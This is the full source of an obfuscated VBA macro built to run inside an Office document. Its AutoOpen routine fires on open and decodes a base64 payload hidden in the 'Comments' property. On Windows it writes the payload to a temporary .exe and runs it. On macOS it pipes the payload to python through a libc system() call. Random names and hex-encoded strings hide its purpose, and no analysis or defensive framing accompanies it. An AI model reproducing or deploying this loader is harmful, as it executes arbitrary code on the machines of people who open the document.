Public Declare PtrSafe Function icjbyogzmjfhfwbau Lib "libc.dylib" Alias "system" (ByVal gqgeahpttpt As String) As Long
Sub AutoOpen()
On Error Resume Next
Dim osdsbwzjvu As String
For Each prop In ActiveDocument.BuiltInDocumentProperties
If prop.Name = itddjegmrpxg("436f6d6d") & itddjegmrpxg("656e7473") Then
osdsbwzjvu = Mid(prop.Value, 56)
orig_val = pikwyearfujrmbw(osdsbwzjvu)
#If Mac Then
meelrbujcsylpaozpz (orig_val)
#Else
wvtrpwvewpyfgmdcz (orig_val)
#End If
Exit For
End If
Next
End Sub
Sub wvtrpwvewpyfgmdcz(code)
On Error Resume Next
Set kkpsegkzuy = CreateObject(itddjegmrpxg("536372") & itddjegmrpxg("697074696e672e46696c6553797374656d4f626a656374"))
tmp_folder = kkpsegkzuy.GetSpecialFolder(2)
tmp_name = tmp_folder + itddjegmrpxg("5c") + kkpsegkzuy.GetTempName() + itddjegmrpxg("2e65") & itddjegmrpxg("7865")
Set solomwrykvlp = kkpsegkzuy.createTextFile(tmp_name)
solomwrykvlp.Write (code)
solomwrykvlp.Close
CreateObject(itddjegmrpxg("57536372697074") & itddjegmrpxg("2e5368656c6c")).Run (tmp_name)
End Sub
Sub meelrbujcsylpaozpz(code)
icjbyogzmjfhfwbau ("echo """ & code & """ | python &")
End Sub
' 1.01 - solves problem with Access And 'Compare Database
Function pikwyearfujrmbw(ByVal base64String)
Const wituxxvamqlnyqmgkx = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrs" & "tuvwxyz0123456789+/"
Dim dataLength, sOut, groupBegin
base64String = Replace(base64String, vbCrLf, "")
base64String = Replace(base64String, vbTab, "")
base64String = Replace(base64String, " ", "")
dataLength = Len(base64String)
If dataLength Mod 4 <> 0 Then
Err.Raise 1, itddjegmrpxg("4261736536344465636f64") & itddjegmrpxg("65"), itddjegmrpxg("4261642077697475787876616d716c6e7971") & itddjegmrpxg("6d676b7820737472696e672e")
Exit Function
End If
For groupBegin = 1 To dataLength Step 4
Dim numDataBytes, CharCounter, thisChar, thisData, nGroup, pOut
numDataBytes = 3
nGroup = 0
For CharCounter = 0 To 3
thisChar = Mid(base64String, groupBegin + CharCounter, 1)
If thisChar = itddjegmrpxg("3d") Then
numDataBytes = numDataBytes - 1
thisData = 0
Else
thisData = InStr(1, wituxxvamqlnyqmgkx, thisChar, vbBinaryCompare) - 1
End If
If thisData = -1 Then
Err.Raise 2, itddjegmrpxg("426173653634446563") & itddjegmrpxg("6f6465"), itddjegmrpxg("426164206368617261") & itddjegmrpxg("6374657220496e2077697475787876616d716c6e79716d676b7820737472696e672e")
Exit Function
End If
nGroup = 64 * nGroup + thisData
Next
nGroup = Hex(nGroup)
nGroup = String(6 - Len(nGroup), itddjegmrpxg("30")) & nGroup
pOut = Chr(CByte(itddjegmrpxg("2648") & Mid(nGroup, 1, 2))) + _
Chr(CByte(itddjegmrpxg("2648") & Mid(nGroup, 3, 2))) + _
Chr(CByte(itddjegmrpxg("2648") & Mid(nGroup, 5, 2)))
sOut = sOut & Left(pOut, numDataBytes)
Next
pikwyearfujrmbw = sOut
End Function
Private Function itddjegmrpxg(ByVal yzyhtgajnuil As String) As String
Dim lwrwvpveepdf As Long
For lwrwvpveepdf = 1 To Len(yzyhtgajnuil) Step 2
itddjegmrpxg = itddjegmrpxg & Chr$(Val("&H" & Mid$(yzyhtgajnuil, lwrwvpveepdf, 2)))
Next lwrwvpveepdf
End Function
